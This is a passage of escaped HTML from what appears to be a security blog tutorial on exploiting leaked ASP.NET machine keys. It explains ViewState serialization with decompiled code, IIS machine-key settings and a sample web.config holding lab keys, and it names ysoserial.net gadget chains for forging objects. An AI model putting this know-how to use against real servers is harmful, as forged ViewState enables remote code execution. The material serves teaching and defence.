+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img7.png"
+width="614"
+height="130"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img7_hu8d10f733e24d0afd498358b79ed73b9a_21747_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img7_hu8d10f733e24d0afd498358b79ed73b9a_21747_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 7 - BurpSuite Request "
+class="gallery-image"
+data-flex-grow="472"
+data-flex-basis="1133px"
+>&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img8.png"
+width="1345"
+height="401"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img8_hub7bede9739a9f619334a50b44df812fb_59161_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img8_hub7bede9739a9f619334a50b44df812fb_59161_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 8 - DnSpy Debug "
+class="gallery-image"
+data-flex-grow="335"
+data-flex-basis="804px"
+>&lt;/p>
+&lt;p>Then the deserialization process yields an object that is passed to the application, it&amp;rsquo;s logic applied and the object is serialized back into the response.&lt;/p>
+&lt;p>In the same class, the method &lt;code>Serialize&lt;/code> will be used for this purpose:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-C#" data-lang="C#">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">private&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="n">Serialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">object&lt;/span> &lt;span class="n">stateGraph&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Purpose&lt;/span> &lt;span class="n">purpose&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">string&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">MemoryStream&lt;/span> &lt;span class="n">memoryStream&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">ObjectStateFormatter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetMemoryStream&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Serialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">memoryStream&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stateGraph&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">memoryStream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SetLength&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">memoryStream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Position&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">byte&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="n">array&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">memoryStream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetBuffer&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">length&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">memoryStream&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Length&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Convert&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ToBase64String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">finally&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ObjectStateFormatter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ReleaseMemoryStream&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">memoryStream&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Seeing this in action:&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img9.png"
+width="1311"
+height="393"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img9_hucb6350b8df726ec04a65e40f1c843a68_53583_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img9_hucb6350b8df726ec04a65e40f1c843a68_53583_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 9 - DnSpy Debug "
+class="gallery-image"
+data-flex-grow="333"
+data-flex-basis="800px"
+>&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img10.png"
+width="618"
+height="194"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img10_hu1b78a0501eb83f3e79c355cea2ae6372_27813_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img10_hu1b78a0501eb83f3e79c355cea2ae6372_27813_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 10 - BurpSuite Response "
+class="gallery-image"
+data-flex-grow="318"
+data-flex-basis="764px"
+>&lt;/p>
+&lt;p>This code align with the microsoft explanation of view state we saw earlier: &amp;ldquo;the current state of the page and values that must be retained during postback are serialized into base64-encoded strings&amp;rdquo;.&lt;/p>
+&lt;p>With this visual walkthrough, we now understand what view state is, its purpose and a bit of what happens under the hood.&lt;/p>
+&lt;h2 id="machine-keys">Machine Keys
+&lt;/h2>&lt;p>As we&amp;rsquo;ve seen, when a view state is sent back to an ASP.NET app, the deserialization process occur.&lt;/p>
+&lt;p>When this architecture was originally designed, deserialization attacks were not a major security concern. This mean that if an attacker craft a malicious serialized object inside the view state, the application will instantiate it. This can be weaponized through gadget chains. The tool ysoserial.net makes this process trivial, but let&amp;rsquo;s talk about it in the attack section.&lt;/p>
+&lt;p>In order to prevent these type of attacks, validation and encryption keys were created and are now enforced by default in ASP.NET.&lt;/p>
+&lt;p>In IIS Manager, the &amp;ldquo;Machine Keys&amp;rdquo; section holds this configuration:&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img11.png"
+width="943"
+height="215"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img11_hu4c9eeef1ea3da22fc29f988a230bb41a_49396_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img11_hu4c9eeef1ea3da22fc29f988a230bb41a_49396_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 11 - Machine Keys "
+class="gallery-image"
+data-flex-grow="438"
+data-flex-basis="1052px"
+>&lt;/p>
+&lt;p>&lt;img src="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img12.png"
+width="1199"
+height="352"
+srcset="https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img12_hue1282963c5bfd9e950d177e174f4b8da_27672_480x0_resize_box_3.png 480w, https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/img/img12_hue1282963c5bfd9e950d177e174f4b8da_27672_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="figure 12 - Machine Keys Configuration "
+class="gallery-image"
+data-flex-grow="340"
+data-flex-basis="817px"
+>&lt;/p>
+&lt;p>Let&amp;rsquo;s define the purpose of these keys.&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Validation Key: Is used to create message authentication code (MAC). Basically this is the key used to sign the viewstate, granting that the view state has not been tampered with. The algorithms available are: AES, MD5, SHA1, TripleDES, HMACSHA256, HMACSHA384, HMACSHA512. There are others purposes for this key, &lt;a class="link" href="https://learn.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection.validationkey?view=netframework-4.8.1&amp;amp;redirectedfrom=MSDN#System_Web_Configuration_MachineKeySection_ValidationKey" target="_blank" rel="noopener"
+>check it in here&lt;/a>.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Encryption Key: Used to encrypt the view state itself. If some sensitive information is stored on the view state, is possible to use this mechanism to encrypt it and mantain safe while client side. There are three values for encryption mode:&lt;/p>
+&lt;ul>
+&lt;li>Always: View state is always encrypted.&lt;/li>
+&lt;li>Never: The view state is never encrypted.&lt;/li>
+&lt;li>Auto: Encrypted only if one of the controls requests it.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>If the option &lt;strong>Automatically generate at runtime&lt;/strong> (figure 12) is enabled, IIS will generate a master machine key for the server lifetime. Then the keys are derived from this master, and the secret itself is not stored on the config file (it’s kept in the registry). This is ideal when running a single server.&lt;/p>
+&lt;p>In a web farm scenario (e.g., behind a load balancer), the keys preferably should be statically configured, because the servers must share the same keys. For more detailed information on this process, these are great resources: &lt;a class="link" href="https://learn.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/w8h3skw9%28v=vs.100%29" target="_blank" rel="noopener"
+>1&lt;/a> &lt;a class="link" href="https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/" target="_blank" rel="noopener"
+>2&lt;/a>&lt;/p>
+&lt;p>In this example we&amp;rsquo;ll be using static keys. To generate it, choose the algorithm and simply click on &amp;ldquo;Generate Keys&amp;rdquo; and &amp;ldquo;Apply&amp;rdquo;. This will add the &amp;ldquo;machineKey&amp;rdquo; section on web.config:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-xml" data-lang="xml">&lt;span class="line">&lt;span class="cl">&lt;span class="c">&amp;lt;!--
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"> For more information on how to configure your ASP.NET application, please visit
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"> https://go.microsoft.com/fwlink/?LinkId=169433
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"> --&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;configuration&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;system.web&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;compilation&lt;/span> &lt;span class="na">targetFramework=&lt;/span>&lt;span class="s">&amp;#34;4.7.2&amp;#34;&lt;/span> &lt;span class="nt">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;httpRuntime&lt;/span> &lt;span class="na">targetFramework=&lt;/span>&lt;span class="s">&amp;#34;4.7.2&amp;#34;&lt;/span> &lt;span class="nt">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;pages&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;namespaces&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;add&lt;/span> &lt;span class="na">namespace=&lt;/span>&lt;span class="s">&amp;#34;System.Web.Optimization&amp;#34;&lt;/span> &lt;span class="nt">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/namespaces&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;controls&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;add&lt;/span> &lt;span class="na">assembly=&lt;/span>&lt;span class="s">&amp;#34;Microsoft.AspNet.Web.Optimization.WebForms&amp;#34;&lt;/span> &lt;span class="na">namespace=&lt;/span>&lt;span class="s">&amp;#34;Microsoft.AspNet.Web.Optimization.WebForms&amp;#34;&lt;/span> &lt;span class="na">tagPrefix=&lt;/span>&lt;span class="s">&amp;#34;webopt&amp;#34;&lt;/span> &lt;span class="nt">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/controls&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/pages&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;machineKey&lt;/span> &lt;span class="na">decryption=&lt;/span>&lt;span class="s">&amp;#34;AES&amp;#34;&lt;/span> &lt;span class="na">decryptionKey=&lt;/span>&lt;span class="s">&amp;#34;42F72B586A8082CFA5D40BE1DEB0AA2C71380B87D0548927&amp;#34;&lt;/span> &lt;span class="na">validation=&lt;/span>&lt;span class="s">&amp;#34;SHA1&amp;#34;&lt;/span> &lt;span class="na">validationKey=&lt;/span>&lt;span class="s">&amp;#34;05A6FB2A837EA6BBD0394646CD63460B28A334D38E77721B8241FFCB69DF3BACC8D26CC97AA92F544833A47D785B28D4796BE03B0E8969E46A923FF8124A486C&amp;#34;&lt;/span> &lt;span class="nt">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/system.web&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>To summarize:&lt;/p>
+&lt;ul>
+&lt;li>ViewState can be &lt;strong>authenticated and encrypted&lt;/strong> (using both validation and encryption keys), or just &lt;strong>authenticated&lt;/strong> (using only the validation key).&lt;/li>
+&lt;li>While it is possible to disable this protection entirely, it is uncommon because Microsoft enforces it by default (&lt;a class="link" href="https://devblogs.microsoft.com/dotnet/farewell-enableviewstatemac/" target="_blank" rel="noopener"
+>see reference&lt;/a>).&lt;/li>
+&lt;/ul>
+&lt;p>Back to the deserialization function, below is the complete code.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-C#" data-lang="C#">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">private&lt;/span> &lt;span class="kt">object&lt;/span> &lt;span class="n">Deserialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span> &lt;span class="n">inputString&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Purpose&lt;/span> &lt;span class="n">purpose&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">IsNullOrEmpty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">inputString&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ArgumentNullException&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;inputString&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">byte&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="n">array&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Convert&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">FromBase64String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">inputString&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">num&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">array&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Length&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">AspNetCryptoServiceProvider&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Instance&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">IsDefaultProvider&lt;/span> &lt;span class="p">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_forceLegacyCryptography&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span> &lt;span class="p">!=&lt;/span> &lt;span class="kc">null&lt;/span> &lt;span class="p">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ContainsEncryptedViewState&lt;/span> &lt;span class="p">||&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">EnableViewStateMac&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Purpose&lt;/span> &lt;span class="n">purpose2&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">purpose&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AppendSpecificPurposes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetSpecificPurposes&lt;/span>&lt;span class="p">());&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ICryptoService&lt;/span> &lt;span class="n">cryptoService&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">AspNetCryptoServiceProvider&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Instance&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetCryptoService&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">purpose2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CryptoServiceOptions&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">None&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">byte&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="n">array2&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">cryptoService&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Unprotect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">array&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">array2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">num&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">array2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Length&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span> &lt;span class="p">!=&lt;/span> &lt;span class="kc">null&lt;/span> &lt;span class="p">&amp;amp;&amp;amp;&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">_page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ContainsEncryptedViewState&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">array&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">MachineKeySection&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">EncryptOrDecryptData&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">array&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetMacKeyModifier&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">num&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">num&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">array&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Length&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
